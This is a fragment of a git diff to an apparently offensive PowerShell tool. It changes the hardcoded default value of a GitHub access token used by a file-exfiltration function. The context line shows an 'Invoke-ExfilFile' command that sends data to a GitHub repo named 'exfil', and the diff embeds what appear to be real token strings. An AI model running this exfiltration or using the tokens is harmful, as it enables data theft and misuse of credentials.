@@ -57,7 +57,7 @@ Invoke-ExfilFile -GHUser nnh100 -GHRepo exfil -GHPAT "xxxxxxxxxxxxxxxxxxxxxxx" -
         [Parameter(Position = 2, Mandatory = $False)]
         [String]
         #$GHPAT = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
-        $GHPAT = "6ad6248b0c3e98ba430a07a2379e49855b56e6c2",
+        $GHPAT = "325e15bcc471887d08651a2a4e1cd1a87b76314e",
 
         [Parameter(Position =3, Mandatory = $False)]
         [String]
